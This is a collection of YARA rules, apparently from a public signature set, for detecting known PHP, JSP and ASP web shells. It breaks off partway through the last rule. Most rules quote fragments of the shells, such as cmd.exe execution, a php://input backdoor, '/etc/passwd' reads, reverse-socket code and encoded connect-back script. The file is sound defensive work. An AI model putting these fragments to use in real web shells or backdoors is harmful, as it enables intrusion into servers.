rule Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_RID3866 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 18:19:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n" 
      $s1 = "Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color" 
   condition: 
      1 of them
} 

rule Webshell_SimAttacker_Vrsion_1_0_0_priv8_4_My_friend_RID3A73 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 19:47:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo" 
      $s3 = "fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim" 
   condition: 
      1 of them
} 

rule Webshell_jsp_12302_RID2D4A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file 12302.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:25:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "</font><%out.print(request.getRealPath(request.getServletPath())); %>" fullword
      $s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword
      $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"" 
   condition: 
      all of them
} 

rule Webshell_asp_cmd_RID2D7D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file cmd.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
      $s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
      $s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
   condition: 
      1 of them
} 

rule Webshell_php_up_RID2D32 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file up.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:21:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);" fullword
      $s3 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {" fullword
      $s8 = "echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];" fullword
   condition: 
      2 of them
} 

rule Webshell_phpshell3_RID2E39 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file phpshell3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:05:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];" 
      $s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna" 
      $s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword
   condition: 
      2 of them
} 

rule Webshell_B374kPHP_B374k_RID2E83 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file B374k.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:17:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Http://code.google.com/p/b374k-shell" fullword
      $s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'" 
      $s3 = "Jayalah Indonesiaku & Lyke @ 2013" fullword
      $s4 = "B374k Vip In Beautify Just For Self" fullword
   condition: 
      1 of them
} 

rule Webshell_jsp_123_RID2CE8 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file 123.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:09:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7" 
      $s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"" 
      $s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword
   condition: 
      all of them
} 

rule Webshell_ASP_tool_RID2DA7 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file tool.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:41:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\"" 
      $s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" " 
      $s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas" 
   condition: 
      2 of them
} 

rule Webshell_phpkit_0_1a_odd_RID304C : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file odd.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:33:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "include('php://input');" fullword
      $s3 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
      $s4 = "// uses include('php://input') to execute arbritary code" fullword
      $s5 = "// php://input based backdoor" fullword
   condition: 
      2 of them
} 

rule Webshell_PHP_Shell_x3_RID2EEF : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file PHP Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:35:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[" 
      $s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input" 
      $s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset(" 
   condition: 
      2 of them
} 

rule Webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_RID41E9 : DEMO T1087 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 01:05:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1087, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
   condition: 
      all of them
} 

rule Webshell_Macker_s_Private_PHPShell_RID3444 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Macker's Private PHPShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:23:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n" 
      $s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[" 
      $s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=" 
   condition: 
      all of them
} 

rule Webshell_jsp_list_RID2E0E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file list.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:58:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
      $s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn" 
      $s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword
   condition: 
      all of them
} 

rule Webshell_php_ghost_RID2E72 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file ghost.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:14:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'" 
      $s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***" 
      $s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"" fullword
   condition: 
      all of them
} 

rule Webshell_php_moon_RID2E06 : DEMO T1087 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file moon.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:56:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1087, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo '<option value=\"create function backshell returns string soname" 
      $s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\"" 
      $s8 = "echo '<option value=\"select cmdshell(\\'net user " 
   condition: 
      2 of them
} 

rule Webshell_browser_201_3_ma_download_RID3412 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:14:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a" 
      $s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith" 
   condition: 
      all of them
} 

rule Webshell_itsec_itsecteam_shell_jHn_RID34D2 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:46:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b" 
      $s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'" 
   condition: 
      all of them
} 

rule Webshell_Ghost_Icesword_Silic_RID329D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files ghost_source.php, icesword.php, silic.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:12:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $" 
      $s6 = "if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST[" 
   condition: 
      all of them
} 

rule Webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx_RID3F1D : DEMO T1012 T1050 T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 23:06:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1012, T1050, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype=" 
      $s9 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T" 
   condition: 
      all of them
} 

rule Webshell_2_520_job_ma1_ma4_2_RID30B8 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:51:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" " 
      $s9 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR" 
   condition: 
      all of them
} 

rule Webshell_JspSpyJDK51_luci_jsp_xxx_RID33CD : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:03:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "ports = \"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\";" fullword
      $s1 = "private static class VEditPropertyInvoker extends DefaultInvoker {" fullword
   condition: 
      all of them
} 

rule Webshell_wso2_5_1_wso2_5_wso2_RID31BD : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:35:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec" 
      $s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na" 
   condition: 
      all of them
} 

rule Webshell_QueryDong_spyjsp2010_t00ls_RID3421 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:17:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')" 
      $s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"" 
   condition: 
      all of them
} 

rule Webshell_r57shell_SnIpEr_EgY_SpIdEr_RID3416 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:15:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name" 
      $s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1" 
      $s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size=" 
   condition: 
      all of them
} 

rule Webshell_JspSpy_xxx_RID2ED6 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:31:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var" 
      $s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu" 
      $s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i" 
   condition: 
      all of them
} 

rule Webshell_JSP_MA_download_RID3037 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:30:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su" 
      $s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but" 
      $s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class=" 
   condition: 
      all of them
} 

rule Webshell_shell_phpspy_2006_arabicspy_RID3505 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:55:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype" 
      $s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P" 
   condition: 
      all of them
} 

rule Webshell_in_JFolder_jfolder01_jsp_leo_warn_RID378A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 17:42:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD" 
      $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi" 
   condition: 
      all of them
} 

rule Webshell_2_520_icesword_job_ma1_ma4_2_RID3477 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:31:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\"," 
      $s3 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ" 
      $s9 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor" 
   condition: 
      all of them
} 

rule Webshell_lite_PHPSPY_RID2E97 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, PHPSPY.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:21:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['comma" 
      $s7 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILE" 
      $s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; " 
   condition: 
      2 of them
} 

rule Webshell_2008_2009lite_2009mssql_RID31A2 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:30:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');" 
      $s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all" 
   condition: 
      all of them
} 

rule Webshell_Arabicspy_PHPSPY_RID3087 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files shell.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, arabicspy.php, PHPSPY.php, hkrkoz.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:43:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
      $s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d" 
   condition: 
      all of them
} 

rule Webshell_JspSpyJDK5_RID2E1D : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:00:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
      $s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword
   condition: 
      1 of them
} 

rule Webshell_Dive_Shell_Emperor_Hacking_Team_RID36B8 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files Dive Shell 1.0 - Emperor Hacking Team.php, phpshell.php, SimShell 1.0 - Simorgh Security MGZ.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 17:07:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals" 
      $s9 = "if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {" fullword
   condition: 
      all of them
} 

rule Webshell_JFolder_jfolder01_xxx_RID32B9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, suiyue.jsp, warn.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:17:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE" 
   condition: 
      all of them
} 

rule Webshell_jsp_reverse_jsp_RID30FA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:02:51"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
      $s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
      $s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword
   condition: 
      all of them
} 

rule Webshell_JFolder_jfolder01_jsp_leo_RID343D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:22:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
      $s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
      $s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
      $s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword
   condition: 
      2 of them
} 

rule Webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2_RID369B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 17:03:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword
      $s6 = "password = (String)session.getAttribute(\"password\");" fullword
      $s7 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231" 
   condition: 
      2 of them
} 

rule Webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx_RID39AE : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 19:14:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI" 
      $s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC" 
   condition: 
      all of them
} 

rule Webshell_PHPJackal_itsecteam_shell_RID3469 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:29:21"
      score = 70
